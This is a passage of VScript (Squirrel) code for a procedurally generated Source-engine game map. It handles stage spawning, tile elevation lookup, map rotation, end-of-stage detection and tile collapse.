			emsg.SetOrigin(sb.GetOrigin()+(sb.GetForwardVector()*t.offset.x)+(sb.GetLeftVector()*t.offset.y)+(sb.GetUpVector()*t.offset.z));
			emsg.SetForwardVector(sb.GetForwardVector() * -1);
			emsg.__KeyValueFromString("message",t.text);
			emsg.__KeyValueFromInt("textsize",t.size);
			emsg.__KeyValueFromVector("color",t.color);
			EntFireByHandle(emsg,"SetParent","spawnplatform",0.05,null,null);
			if("givename" in t)
			{
				emsg.__KeyValueFromString("targetname","spawninfoboard_plugintext");
				EntFireByHandle(emsg,"AddOutput","targetname spawninfoboard_plugintext",0.00,null,null);
				EntFireByHandle(emsg,"AddOutput","targetname spawninfoboard_plugintext",0.05,null,null);
				EntFireByHandle(emsg,"AddOutput","targetname spawninfoboard_plugintext",0.35,null,null);
				EntFireByHandle(emsg,"AddOutput","targetname spawninfoboard_plugintext",0.55,null,null);
				EntFireByHandle(emsg,"AddOutput","targetname spawninfoboard_plugintext",1.05,null,null);
			}
		}
		local sbdir = sb.GetForwardVector();
		sbdir.z = 0.00;
		sbdir.Norm();
		local emsg = Entities.CreateByClassname("point_worldtext");
		local msg = "";
		local msg_sideofs = 300;
		if(::stage!=null)
		{
			if(stage<4)
				msg = "Stage "+(1+::stage).tostring()+"/"+::STAGES.len()+" | "+::STAGES[::stage].stage_goal.tostring()+" levels | "+::THEME+" | "+::STAGES[::stage].ending.tolower();
			else
			{
				msg_sideofs = 56;
				if(stage==4)
					msg = "Finale";
				else
				{
					msg_sideofs = 120;
					msg = "Infinite mode";
				}
			}
		}
		local msgpos = Vector(0,0,200)+(sbdir*480)+(::AnglesToDir(::DirToAngles(sbdir)+Vector(0,90,0))*msg_sideofs);
		emsg.SetOrigin(msgpos);
		emsg.SetForwardVector(sbdir);
		emsg.__KeyValueFromString("message",msg);
		emsg.__KeyValueFromString("targetname","spawn_introtext");
		emsg.__KeyValueFromInt("textsize",30);
		emsg.__KeyValueFromVector("color",Vector(255,255,0));
		EntFireByHandle(emsg,"SetParent","spawnplatform",0.05,null,null);
	}catch(e){printl("[spawninfoboard text error]: "+e);}
	if(::finale_started)return;
	EntFireByHandle(self,"RunScriptCode"," SpawnMap(); ",1.00,null,null);
	EntFireByHandle(self,"RunScriptCode"," TickStageEndPos(); ",1.50,null,null);
}
function GetMapIndex(x,y){return (((-1)+((MAP_SIZE*MAP_SIZE)-(MAP_SIZE*y)))+x);}
function GetMapIndexType(map,x,y){local t=GetMapIndex(x,y);if(t<0||t>(map.len()-1))return null;return map[t];}
function GetElevation(index)
{
	//return ::TYPES[index].elevation;		//OLD
		//new in V1_7:
		if((typeof index) == "Vector")		//safeguard to make it run COLOR
			index = 9999;
		if(!(index in ::TYPES))				//safeguard to default it to ASSUMEDFLOOR if non-existing
			index = 9998;
		return ::TYPES[index].elevation;
}
function GetMapNeighborIndex(map,x,y,dir)
{
	local curidx = GetMapIndex(x,y);
		//BACKUP (up/down seems inverted)
			//if(dir=="up")curidx += (MAP_SIZE);
			//else if(dir=="down")curidx -= MAP_SIZE;
	if(dir=="up")curidx -= (MAP_SIZE);
	else if(dir=="down")curidx += MAP_SIZE;
				//BACKUP (seems borked on sides?):
					//else if(dir=="left"){if(((x+((MAP_SIZE*y)))-1)<=((MAP_SIZE*y)))return null; curidx--;}
					//else if(dir=="right"){if(((x+((MAP_SIZE*y)))+1)>=(((MAP_SIZE*(y+1)))-1))return null; curidx++;}
	else if(dir=="left"){if(((x+((MAP_SIZE*y)))-1)<=((MAP_SIZE*y)))return null; curidx--;}
	else if(dir=="right"){if(((x+((MAP_SIZE*y))))>=(((MAP_SIZE*(y+1)))))return null; curidx++;}
	else return null;
	if(curidx < 0)return null;
	if(curidx > (map.len()-1))return null;
	local retval = map[curidx];
	if((typeof retval) == "Vector")retval = 9999;	//COLOR
	return (retval);
}
function GetElevationFromNeighbors(map,x,y,only_closest=true,direction="all",fallback=null)
{
	if(fallback==null)fallback = (0.00+DEFAULT_ELEVATION);
	local elevation = null;
	local directions = [];
	local elevations = [];
	local lowest = false;
	local closest_lowest = false;
	if(direction == "lowest")
	{
		direction = "all";
		lowest = true;
	}
	else if(direction == "closest_lowest")
	{
		direction = "all";
		closest_lowest = true;
	}
	if(direction=="all"){directions = [{name="left",x = -1,y = 0},{name="right",x = 1,y = 0},{name="up",x = 0,y = 1},{name="down",x = 0,y = -1}];}
	else if(direction=="left"){directions = [{name="left",x = -1,y = 0}];}
	else if(direction=="right"){directions = [{name="right",x = 1,y = 0}];}
	else if(direction=="up"){directions = [{name="up",x = 0,y = 1}];}
	else if(direction=="down"){directions = [{name="down",x = 0,y = -1}];}
	else{printl("GetElevationFromNeighbors ERROR - no valid direction in param (direction="+direction+") - returning fallback");return fallback;}
	foreach(dir in directions)
	{
		local curx = 0+x;
		local cury = 0+y;
		local checklength = 1+MAP_SIZE;
		for(local i=0;i<checklength;i++)
		{
			local neighbor_index = GetMapNeighborIndex(map,curx,cury,dir.name);
			if(!(neighbor_index in ::TYPES))neighbor_index = 9998;	//new in V1_7
			if(neighbor_index==null)break;
			if((typeof neighbor_index)=="Vector")break;
			if(::TYPES[neighbor_index].name=="EMPTY")break;			//give up line of sight search here     (the 'EMPTY_LOS' tile bypasses this if needed)
			if(::TYPES[neighbor_index].name=="WALL")break;			//give up line of sight search here
			if(lowest)		//new funk - make FALL separators!		//give up line of sight search here
			{
				if(::TYPES[neighbor_index].name=="LIQUID_FALL")break;
				if(::TYPES[neighbor_index].name=="HAZLIQUID_FALL")break;
			}
			local neighbor_elevation = GetElevation(neighbor_index);
			if(neighbor_elevation!=null){elevations.push({elevation=neighbor_elevation,checkdist=(0+i)});break;}
			if(only_closest)break;
			curx += dir.x;
			cury += dir.y;
		}
	}
	if(elevations.len()<=0)return fallback;
	if(elevations.len()==1)elevation = elevations[0].elevation;
	else if(elevations.len()==2)
	{
		if(elevations[0].elevation < elevations[1].elevation)
			elevation = elevations[0].elevation;
		else
			elevation = elevations[1].elevation;
	}
	else
	{
		if(lowest)
		{
			local lowest_elev = 99999;
			foreach(e in elevations)
			{
				if(e.elevation < lowest_elev)
					lowest_elev = (0+e.elevation);
			}
			if(lowest_elev > 2000)
				return fallback;
			elevation = lowest_elev;
			return elevation;
		}
		if(closest_lowest)
		{
			local lowest_elev = 99999;
			local lowest_index = 99999;
			foreach(e in elevations)
			{
				if(e.checkdist < lowest_index)
				{
					lowest_elev = (0+e.elevation);
					lowest_index = (0+e.checkdist);
				}
			}
			if(lowest_elev > 2000)
				return fallback;
			elevation = lowest_elev;
			return elevation;
		}
		local maxcount = 0;
		local maxcountindex = null;
		local majorities = [];
		foreach(e in elevations)
		{
			local count = 0;
			local index = e.elevation;
			foreach(ee in elevations)
			{
				if(ee.elevation==e.elevation)
					count++;
			}
			if(count >= maxcount)
			{
				if(count > maxcount)
					majorities.clear();
				majorities.push(index);
				maxcount = count;
				
				maxcountindex = index;
			}
		}
		if(majorities.len()<=0)return fallback;
		if(majorities.len()==1)elevation = majorities[0];
		else
		{
			local lowestmaj = 99999;
			foreach(m in majorities)
			{
				if(m < lowestmaj)
					lowestmaj = (0+m);
			}
			if(lowestmaj < 999)elevation = lowestmaj;
			else
			{
				//prioritize lowest because fuck you i guess, maybe?
				local lowest_elev = 99999;
				foreach(e in elevations)
				{
					if(e.elevation < lowest_elev)
						lowest_elev = (0+e.elevation);
				}
				if(lowest_elev > 2000)
					return fallback;
				elevation = lowest_elev;
				return elevation;
			}
		}
	}
	if(elevation!=null)
		return elevation;
	return fallback;
}
function GetNeighboringFloorData(map,x,y,fallback,is_ladder_climb = false,random_modelvariant=false)
{
	local validfound = true;
	local majority_index = -50;		//this should be the majority -> lowest of neighbor-floors (default to platform if none found)
	local counts = [0,0,0,0];		//floor, platform, floorceiling, floorceilingtall		last one wins/takes priority if the same amount as earlier
	local celevation = GetElevationFromNeighbors(map,x,y,true,"all",-10.00);
	if(celevation < -5.00)celevation = GetElevationFromNeighbors(map,x,y,false,"all",-10.00);
	if(celevation < -5.00)celevation = (0+DEFAULT_ELEVATION);
	local checks = ["left","right","up","down"];
	foreach(c in checks)
	{
		local nindex = GetMapNeighborIndex(map,x,y,c);
		if(nindex==null || (typeof nindex) == "Vector")continue;
		
		if(::TYPES[nindex].name == "FLOOR")counts[0]++;
		else if(::TYPES[nindex].name == "PLATFORM")counts[1]++;
		else if(::TYPES[nindex].name == "FLOORCEILING")counts[2]++;
		else if(::TYPES[nindex].name == "FLOORCEILINGTALL")counts[3]++;
	}
	if((counts[0]+counts[1]+counts[2]+counts[3]) == 0)	//^FIRST PASS, checks closest		vSECOND PASS IF NOT FOUND IN FIRST PASS, checks range (stops at valid/wall/empty/null)
	{
		local checks = [	{		dir = "left",		xofs = -1,		yofs = 0		},
							{		dir = "right",		xofs = 1,		yofs = 0		},
							{		dir = "up",			xofs = 0,		yofs = 1		},
							{		dir = "down",		xofs = 0,		yofs = -1		}];
		foreach(c in checks)
		{
			local xo = 0+x;
			local yo = 0+y;
			for(local i=0;i<(1+MAP_SIZE);i++)
			{
				local nindex = GetMapNeighborIndex(map,xo,yo,c.dir);
				if(nindex==null || nindex==0 || nindex==1 || (typeof nindex) == "Vector")continue;
				if(::TYPES[nindex].name == "FLOOR"){counts[0]++;break;}
				else if(::TYPES[nindex].name == "PLATFORM"){counts[1]++;break;}
				else if(::TYPES[nindex].name == "FLOORCEILING"){counts[2]++;break;}
				else if(::TYPES[nindex].name == "FLOORCEILINGTALL"){counts[3]++;break;}
				xo += c.xofs;
				yo += c.yofs;
			}
		}
	}
	local winner = -1;
	local winner_count = 0;
	if((counts[0]+counts[1]+counts[2]+counts[3]) == 0)//default to PLATFORM if no valid neighbors are found
	{
		counts[1] = 9999;
		winner = 1;
		validfound = false;
	}
	else
	{
		for(local i=0;i<counts.len();i++)
		{
			if(counts[i] >= winner_count)
			{
				winner = (0+i);
				winner_count = (0+counts[i]);
			}
		}
	}
	if(!is_ladder_climb)
	{
		if(winner==0)majority_index = 4+celevation;				//FLOOR
		else if(winner==1)majority_index = 24+celevation;		//PLATFORM
		else if(winner==2)majority_index = 44+celevation;		//FLOORCEILING
		else if(winner==3)majority_index = 104+celevation;		//FLOORCEILINGTALL
	}
	else
	{
		if(winner==0)majority_index = 4+celevation;				//FLOOR
		else majority_index = 24+celevation;					//PLATFORM
	}
	if(majority_index < -20)majority_index = (0+fallback);
	majority_index = majority_index.tointeger();	//wtf is this shit
	local model = null;
	if(random_modelvariant)
		model = ::TILEVARIANTS[::TYPES[0+majority_index].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[0+majority_index].name][::THEME].main.len()-1)];
	else
		model = ::TILEVARIANTS[::TYPES[0+majority_index].name][::THEME].main[0];
	return {
		index = (0+majority_index),
		elevation = (0+celevation),
		model = model,
		validfound = validfound,
	};
}
::DirToAngles<-function(dir)
{
	::manager.SetForwardVector(dir);
	return ::manager.GetAngles();
}
::AnglesToDir<-function(angles)
{
	::manager.SetAngles(angles.x,angles.y,angles.z);
	return ::manager.GetForwardVector();
}
function GetRotatedMap(_map,direction="east",mirrored=false)
{
											//"east","north","west","south" (east default, look at map towards north to match image)
	local rot_amount = 0;					//CCW:	east=0:0, north=1:90, west=2:180, south=3:270
	if(direction=="north")rot_amount		+= 1;
	else if(direction=="west")rot_amount	+= 2;
	else if(direction=="south")rot_amount	+= 3;
	rot_amount++;
	mirrored = !mirrored;
	local result = [];
	foreach(m in _map){result.push(m);}
	if(mirrored)
	{
		local mirror = [];
		for(local x=0;x<result.len();x+=MAP_SIZE)
		{
			local temp = [];
			local rowmax = (0+x+MAP_SIZE);
			for(local y=(0+x);y<rowmax;y++)
				{temp.insert(0,result[y]);}
			foreach(t in temp){mirror.push(t);}
		}
		result = mirror;
	}
	for(local rotamt=0;rotamt<rot_amount;rotamt++)
	{
		local temp = [];
		foreach(m in result){temp.push(m);}
		for(local x = 0; x < MAP_SIZE; x++)
		{
			for(local y = 0; y < MAP_SIZE; y++)
			{
				if(x!=y)
					temp[y + x * MAP_SIZE] = result[x + y * MAP_SIZE];
			}
		}
		result = temp;
		local flip = [];
		foreach(i in result){flip.insert(0,i);}
		result = flip;
		local mirror = [];
		for(local x=0;x<result.len();x+=MAP_SIZE)
		{
			local temp = [];
			local rowmax = (0+x+MAP_SIZE);
			for(local y=(0+x);y<rowmax;y++)
				{temp.insert(0,result[y]);}
			foreach(t in temp){mirror.push(t);}
		}
		result = mirror;
	}
	return result;
}
lastbbox <- null;
lastbboxes <- [];
mapspawnindex <- 0;
spawnmap_delay <- 6.00;				//make sure this delay makes it so that the previous stage has faded out before spawning in the next one, keep it safe!
noprint <- false;
noprint_maptiles <- true;			//set this to 'true' to prevent each map tile index from being printed to console (extra loops/possibly spammy/cluttery)
disable_generatenextmap <- false;	//set this to 'true' to completely deny 'GenerateNextMap()' calls
function GenerateNextMap()			//call this when you want to spawn in the next stage
{
	if(disable_generatenextmap)return;
	local movetp_clean = true;
	if(::stage==null || ::stage >= ::STAGES.len()){}
	else
	{
		if(mapspawnindex >= ::STAGES[::stage].stage_goal)
		{
			if(::ENDINGS[::STAGES[::stage].ending].cancel_mapspawn)
				noprint = true;
			if(!::ENDINGS[::STAGES[::stage].ending].movetp_clean)
				movetp_clean = false;
		}
	}
	if(movetp_clean)
		EntFire("manager","RunScriptCode"," MoveTP(); ",0.00,null);
	local smap_delay = (0.00+spawnmap_delay);
	if(::NEXTMAPGEN_TIME_OVERRIDE!=null)smap_delay = (0.00+::NEXTMAPGEN_TIME_OVERRIDE);
	EntFire("manager","RunScriptCode"," SpawnMap(); ",smap_delay,null);
	::delay_timer = 0.00;
	if(::OPEN_HOLDS_ON_NEWSTAGE)
	{
		EntFire("block_"+mapspawnindex.tostring()+"_hold_*","FireUser1","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.00,null);
		EntFire("block_"+mapspawnindex.tostring()+"_hold_*","FireUser3","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.00,null);
		EntFire("block_"+mapspawnindex.tostring()+"_generichold","FireUser2","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.00,null);
		EntFire("block_"+mapspawnindex.tostring()+"_generichold","FireUser1","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.05,null);
		EntFire("block_"+mapspawnindex.tostring()+"_button","Kill","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.00,null);
		EntFire("block_"+mapspawnindex.tostring()+"_breakable","Kill","",::OPEN_HOLDS_ON_NEWSTAGE_D+0.00,null);
	}
}
TickStageEndPos_TICKRATE <- 0.20;
TickStageEndPos_DISABLEFORCE <- false;
TickStageEndPos_COOLDOWN <- false;
TickStageEndPos_COOLDOWN_SET <- 3.00;
stage_end_pos_mustbeinstage <- false;		//used for race-ending specifically, player MUST be in range from stage-center (inside active stage) to allow it triggering
function TickStageEndPos()
{
	EntFireByHandle(self,"RunScriptCode"," TickStageEndPos(); ",TickStageEndPos_TICKRATE,null,null);
	if(TickStageEndPos_COOLDOWN)return;
	if(TickStageEndPos_DISABLEFORCE)return;
	if(stage_end_pos==null)return;
	if(::finale_checkout_processed)return;
	if(DEBUG)DebugDrawBox(stage_end_pos,Vector(-(stage_end_pos_range),-(stage_end_pos_range),-(stage_end_pos_range)),
	Vector((stage_end_pos_range),(stage_end_pos_range),(stage_end_pos_range)),163,73,164,100,TickStageEndPos_TICKRATE+0.05)
	for(local h;h=Entities.FindByClassnameWithin(h,"player",stage_end_pos,stage_end_pos_range);)
	{
		if(h==null||!h.IsValid()||h.IsAlive()==false)
			continue;
		
		//__CSS__ webscript - v2 fix implemented here:
		if(h.GetTeam()==2||h.GetTeam()==3){}else continue;	//new in v2 - make damn sure it's not a spectating player
		
		if(!stage_end_pos_allowdifh)
		{
			if(h.GetOrigin().z < (0 + stage_end_pos.z - 8))continue;		//too far below end-trigger
			if(h.GetOrigin().z > (0 + stage_end_pos.z + 155))continue;		//too far above end-trigger
		}
		if(stage_end_pos_mustbeinstage)
		{
			local stagecenter = Vector()+::MAPDATA[mapspawnindex].center_pos;
			stagecenter.z = 0.00;
			local playerpos = Vector()+h.GetOrigin();
			playerpos.z = 0.00;
			if(		playerpos.x < (stagecenter.x + ((MAP_SIZE/2)*GRID_SIZE))	&&
					playerpos.x > (stagecenter.x - ((MAP_SIZE/2)*GRID_SIZE))	&&
					playerpos.y < (stagecenter.y + ((MAP_SIZE/2)*GRID_SIZE))	&&
					playerpos.y > (stagecenter.y - ((MAP_SIZE/2)*GRID_SIZE))
			){}else continue;
		}
		EndFound(false);
		TickStageEndPos_COOLDOWN = true;
		EntFire("manager","RunScriptCode","TickStageEndPos_COOLDOWN=false;",TickStageEndPos_COOLDOWN_SET,null);
		break;
	}
}
function EndFound(destroyed=false)
{
	if(stage_end_pos==null)return;
	stage_end_pos = null;
	local opentime = ::THEMES[::THEME].endtile_time;
	local info = "FOUND";
	if(destroyed)info = "DESTROYED";
	if(::finale_endrun_started)
		::ServerSay("say ***ESCAPE***",0.00,null);
	else if(::ENDINGS.RACE.started){opentime=0.00;}
	else if(opentime <= 0.00)
	{
		opentime = 0.00;
		if(!disable_generatenextmap)::ServerSay("say ***END "+info+" - GENERATING NEXT MAP***",0.00,null);
	}
	else if(!disable_generatenextmap)
	{
		::ServerSay("say ***END "+info+" - GENERATING NEXT MAP IN "+opentime.tostring()+" SECONDS***",0.00,null);
		::ServerSay("say ***GENERATING NEXT MAP***",opentime,null);
	}
	::delay_timer = 0.00;
	if(::NEXTMAPGEN_TIME_OVERRIDE != null)opentime = (0.00+::NEXTMAPGEN_TIME_OVERRIDE);
	EntFireByHandle(self,"RunScriptCode"," GenerateNextMap(); ",opentime,null,null);
	local eic = ::ENDINDICATOR_TRIGGERED.x.tostring()+" "+::ENDINDICATOR_TRIGGERED.y.tostring()+" "+::ENDINDICATOR_TRIGGERED.z.tostring();
	local eico = ::ENDINDICATOR_OLD.x.tostring()+" "+::ENDINDICATOR_OLD.y.tostring()+" "+::ENDINDICATOR_OLD.z.tostring();
	try{local bei=Entities.FindByName(null,"block_"+mapspawnindex.tostring()+"_endindicator");
	bei.ValidateScriptScope();bei.GetScriptScope().endtriggered<-true;}catch(e){}
	EntFire("block_"+mapspawnindex.tostring()+"_endindicator","AddOutput","rendercolor "+eic,0.00,null);
	EntFire("block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_endindicator","AddOutput","skin 1",0.00,null);
	EntFire("block_"+::manager.GetScriptScope().mapspawnindex.tostring()+"_endindicator","AddOutput","glowenabled 1",0.00,null);
	EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","skin 0",0.00,null);
	EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","glowenabled 0",0.00,null);
	EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_endindicator","AddOutput","rendercolor "+eico,0.00,null);
}
//		local hpgen = ::GenerateHealthByPlayerNumber(base,each_ct,each_t,include_dead_ct,include_dead_t);
::GenerateHealthByPlayerNumber<-function(_base=500,each_ct=200,each_t=50,include_dead_ct=false,include_dead_t=true)
{
	local result = 0;
	result += _base;
	for(local h;h=Entities.FindByClassname(h,"player");)
	{
		if(h==null||!h.IsValid())continue;
		if(h.GetTeam()==3)
		{
			if(h.IsAlive()==false && !include_dead_ct)
				continue;
			result += each_ct;
		}
		else if(h.GetTeam()==2)
		{
			if(h.IsAlive()==false && !include_dead_t)
				continue;
			result += each_t;
		}
	}
	if(result<=1)result=1;
	return result;
}
::GetDistance<-function(v1,v2){return sqrt((v1.x-v2.x)*(v1.x-v2.x)+(v1.y-v2.y)*(v1.y-v2.y)+(v1.z-v2.z)*(v1.z-v2.z));}



//__CSS__ no more physics		-	block template + model template are prop_dynamic now (in .vmf), previously prop_physics_override
::ConvertProp <- function(handle,type,spawnflags=null,kill_og=true,solid=null)				//__CSS__ no more physics
{
	if(handle==null||!handle.IsValid())return null;
	type = type.tolower();
	if(type!="prop_physics_override"&&type!="prop_dynamic"&&type!="prop_door_rotating")return null;
	local targetname = handle.GetName();
	local parenthandle = handle.GetMoveParent();
	local origin = handle.GetOrigin();
	local angles = handle.GetAbsAngles();
	local model = handle.GetModelName();
	local skin = handle.GetSkin();
	local body = ::NetProps.GetPropInt(handle,"m_nBody");
	local rendermode = ::NetProps.GetPropInt(handle,"m_nRenderMode");
	local lightorigin = ::NetProps.GetPropString(handle,"m_iszLightingOrigin");
	
	local color = ::GetColor(handle);
	if(kill_og)handle.AcceptInput("Kill","",null,null);
	local stable = {
			targetname = targetname,
			origin = origin,
			angles = angles,
			model = model,
			skin = skin,
			body = body,
			rendermode = rendermode,
			lightingorigin = lightorigin,
		};
	if(spawnflags!=null)stable.spawnflags <- spawnflags;
	if(solid!=null)stable.solid <- solid;
	local newhandle = SpawnEntityFromTable(type,stable);
	::NetProps.SetPropBool(newhandle,"m_bForcePurgeFixedupStrings",true);
	::SetColor(newhandle,color.r,color.g,color.b,color.a);
	if(parenthandle!=null&&parenthandle.IsValid())newhandle.AcceptInput("SetParent","!activator",parenthandle,null);
	return newhandle;
}


//		::CollapseTile(tilenode,function(h){});	
::CollapseTile <- function(tile,breakfunc)	//__CSS__ prop_physics_override is now prop_dynamic, so this wrapper is now needed		//__CSS__ no more physics
{
	if(tile==null||!tile.IsValid())return;
	if(tile.GetClassname()=="prop_physics"||tile.GetClassname()=="func_physbox")
	{
		breakfunc(tile);
		return;
	}
	if(tile.GetClassname()!="prop_dynamic"&&tile.GetClassname()!="prop_door_rotating")
	{
		//printl("::CollapseTile warning - not a prop_dynamic/prop_door_rotating:    "+tile);
		breakfunc(tile);
		return;
	}
	local ctile = ::ConvertProp(tile,"prop_physics_override");
	if(ctile==null||!ctile.IsValid())return;
	breakfunc(ctile);
}



//	pos = origin pos
//	xyradius = the xy-dist to check from pos
//	zradius = the z-radius to check from pos
//	kill_tp_players = if true it'll kill CT's on-touch and TP T's back to spawn on-touch
//	trigger_temcleaner = if true it'll Trigger the 'temcleaner_xxx' relays it touches
//	debugdraw = set this to 'true' to DebugDrawBox the scan (note that it'd be a cylindrical hitbox)
killtiles_currentphys <- 0;
::killtiles_tslow_falltime <- 7.00;			//hammer-item: how long to wait until actually making the tile fall + enabling slowtrigger (will be faded/red at 0.00)
::killtiles_tslow_tcleantime <- 7.00;		//hammer-item: how long to wait until killing off the slowtrigger (from the moment it falls, based on ^'::killtiles_tslow_falltime')
::killtiles_tslow_time <- 10.00;			//hammer-item: how long to slow T's for on-trigger-touch
::killtiles_tslow_amount <- 0.80;			//hammer-item: how much to slow T's on-trigger-touch
::killtiles_tslow_tsize <- 32;				//hammer-item: the slow-trigger XY mins/maxs size
function KillTilesWithin(pos,xyradius,zradius,kill_tp_players=false,trigger_temcleaner=false,debugdraw=false,hammersafetrig=false)
	//{newthread(_KillTilesWithin.bindenv(this)).call(pos,xyradius,zradius,kill_tp_players,trigger_temcleaner,debugdraw,hammersafetrig);}	//__CSS__ threading_disabled
	{_KillTilesWithin(pos,xyradius,zradius,kill_tp_players,trigger_temcleaner,debugdraw,hammersafetrig);}
function _KillTilesWithin(pos,xyradius,zradius,kill_tp_players=false,trigger_temcleaner=false,debugdraw=false,hammersafetrig=false)
{
	if(debugdraw)DebugDrawBox(pos,Vector(-xyradius,-xyradius,-zradius),Vector(xyradius,xyradius,zradius),255,0,0,200,0.12);
	for(local h;h=Entities.FindByNameWithin(h,"block_*",pos,500+xyradius+zradius);)
	{
		local xydist = 99999;
		local zdist = 99999;
		local hpos = h.GetOrigin();
		hpos.z = 0+pos.z;
		zdist = ::GetDistance(hpos,h.GetOrigin());
		hpos = h.GetOrigin();
		hpos.x = 0+pos.x;
		hpos.y = 0+pos.y;
		xydist = ::GetDistance(hpos,h.GetOrigin());
		if(xydist > xyradius || zdist > zradius)
			continue;
		if(h.GetName().find("button")!=null)
			EntFireByHandle(h,"RunScriptCode"," Press(true); ",0.00,null,null);
		else
		{
			h.ValidateScriptScope();
			if("killedoff" in h.GetScriptScope() || "startendtile" in h.GetScriptScope())
				continue;
			h.GetScriptScope().killedoff <- true;
			if(hammersafetrig)
			{
				EntFireByHandle(h,"AddOutput","rendermode 1",0.00,null,null);
				EntFireByHandle(h,"AddOutput","rendercolor 255 50 50",0.00,null,null);
				local fallindtime = (0.00+::killtiles_tslow_falltime-1.50);
				if(fallindtime>0.00)EntFireByHandle(h,"RunScriptCode"," self.SetOrigin(self.GetOrigin()+Vector(0,0,-16)); ",fallindtime,null,null);
				
				
				local spos = h.GetOrigin();
				::Ent(spos,Vector(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_t",
					},{
					touchers = [],
					function Touch(){
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(toucher==null||!toucher.IsValid()||toucher.IsAlive()==false)return;
						foreach(t in touchers){if(t==toucher)return;}
						touchers.push(toucher);
						EntFire("manager","RunScriptCode"," AddSpeed(-"+::killtiles_tslow_amount.tostring()+"); ",0.00,toucher);
						EntFire("manager","RunScriptCode"," AddSpeed("+::killtiles_tslow_amount.tostring()+"); ",::killtiles_tslow_time,toucher);
					},function Run(){
						local mm = (0+::killtiles_tslow_tsize).tostring();
						EntFireByHandle(self,"AddOutput","mins -"+mm+" -"+mm+" -3000",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs "+mm+" "+mm+" 2000",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",::killtiles_tslow_falltime+0.03,null,null);
						EntFireByHandle(self,"Kill","",::killtiles_tslow_falltime+::killtiles_tslow_tcleantime,null,null);
							//EntFireByHandle(self,"RunScriptCode",
							//" DebugDrawBoxAngles(self.GetOrigin(),self.GetBoundingMins()"+
							//",self.GetBoundingMaxs(),self.GetAngles(),0,0,0,200,::killtiles_tslow_falltime+::killtiles_tslow_tcleantime); ",0.05,null,null);
						//self.PrecacheModel("models/luffaren/collective_wall.mdl");
						::Ent(self.GetOrigin()+Vector(0,0,400),self.GetAngles(),"prop_dynamic",{
								model = "models/luffaren/collective_wall.mdl",
								rendermode = 1,
								renderamt = 0,
								rendercolor = "255 100 0 0",
								glowenabled = 0,
								glowstyle = 1,
								glowdist = 3000,
								glowcolor = "100 20 0",
							},{
							master = self,
							function Run(){
								EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
								EntFireByHandle(self,"AddOutput","glowenabled 1",::killtiles_tslow_falltime,null,null);
								EntFireByHandle(self,"AddOutput","renderamt 75",::killtiles_tslow_falltime,null,null);
								EntFireByHandle(self,"AddOutput","rendercolor 255 100 0 75",::killtiles_tslow_falltime,null,null);
							}});
					}});
				
				
				
				::CollapseTile(h,function(hh){
					hh.AcceptInput("DisableMotion","",null,null);
					EntFireByHandle(hh,"EnableMotion","",::killtiles_tslow_falltime+0.02,null,null);
					EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",::killtiles_tslow_falltime+0.00,null,null);
					EntFireByHandle(hh,"Kill","",::killtiles_tslow_falltime+killtiles_physkilltime,null,null);
				});
				//EntFireByHandle(h,"EnableMotion","",::killtiles_tslow_falltime+0.02,null,null);
				//EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",::killtiles_tslow_falltime+0.00,null,null);
				//EntFireByHandle(h,"Kill","",::killtiles_tslow_falltime+killtiles_physkilltime,null,null);
				
			}
			else
			{
				if(killtiles_currentphys > killtiles_maxphys || h.GetMoveParent()!=null)
					EntFireByHandle(h,"Kill","",0.00,null,null);
				else
				{
					killtiles_currentphys++;
					EntFireByHandle(self,"RunScriptCode"," killtiles_currentphys--; ",killtiles_physkilltime,null,null);
					
					
					::CollapseTile(h,function(hh){
						hh.AcceptInput("DisableMotion","",null,null);
						EntFireByHandle(hh,"EnableMotion","",0.02,null,null);
						EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(hh,"Kill","",killtiles_physkilltime,null,null);
					});
					//EntFireByHandle(h,"EnableMotion","",0.02,null,null);
					//EntFireByHandle(h,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					//EntFireByHandle(h,"Kill","",killtiles_physkilltime,null,null);
					
				}
			}
		}
	}
	if(kill_tp_players)
	{
		for(local h;h=Entities.FindByClassnameWithin(h,"player",pos,500+xyradius+zradius);)
		{
			if(h==null||!h.IsValid()||h.IsAlive()==false)continue;
			local xydist = 99999;
			local zdist = 99999;
			local hpos = h.GetOrigin();
			hpos.z = 0+pos.z;
			zdist = ::GetDistance(hpos,h.GetOrigin());
			hpos = h.GetOrigin();
			hpos.x = 0+pos.x;
			hpos.y = 0+pos.y;
			xydist = ::GetDistance(hpos,h.GetOrigin());
			if(xydist > xyradius || zdist > zradius)
				continue;
			if(h.GetTeam()==3)
				EntFireByHandle(h,"SetHealth","-1",0.00,null,null);
			else
			{
				//disabled in v1_6 - potential infinite-TP-hell for zombies, not worth it
				//h.SetVelocity(Vector());
				//h.SetOrigin(Vector(0,0,-16120));
			}
		}
	}
	if(trigger_temcleaner)			//this goes by the relay-position, if traps are moving you may need to make the relay follow the trap
	{
		for(local h;h=Entities.FindByName(h,"temcleaner_*");)		//can't do "Within" for relays seemingly..
		{
			local xydist = 99999;
			local zdist = 99999;
			local hpos = h.GetOrigin();
			hpos.z = 0+pos.z;
			zdist = ::GetDistance(hpos,h.GetOrigin());
			hpos = h.GetOrigin();
			hpos.x = 0+pos.x;
			hpos.y = 0+pos.y;
